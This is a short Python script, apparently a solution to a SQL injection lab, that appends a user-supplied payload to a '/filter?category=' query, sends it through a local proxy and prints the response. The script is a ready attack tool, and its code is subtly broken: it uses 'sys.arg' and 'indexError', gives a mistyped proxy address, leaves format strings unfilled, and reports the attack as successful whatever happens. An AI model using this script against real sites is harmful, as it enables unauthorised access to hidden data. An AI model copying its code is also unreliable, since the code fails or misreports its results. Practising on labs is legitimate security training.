#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
import sys
import urllib

proxies = {'http' : 'http://124.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def exploit_SQLi(url,payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    print(r.text)
    return True

if __name__ == '__main__':
    try:
        url = sys.arg[1].strip()
        payload = sys.arg[2].strip()
    except indexError:
        print("[-] usage: %s <url> <payload>", sys.arg[0])
        print("[-] example: %s www.example.com '1=1'", sys.arg[0])
        sys.exit(-1)
        
if exploit_SQLi(url,payload):
    print("[+] " + '\033[32m' +  "SQL injection attack successful" + '\033[0m')
else:
    print("[+] " + '\033[31m' +  "SQL injection attack unsuccessful" + '\033[0m')
    
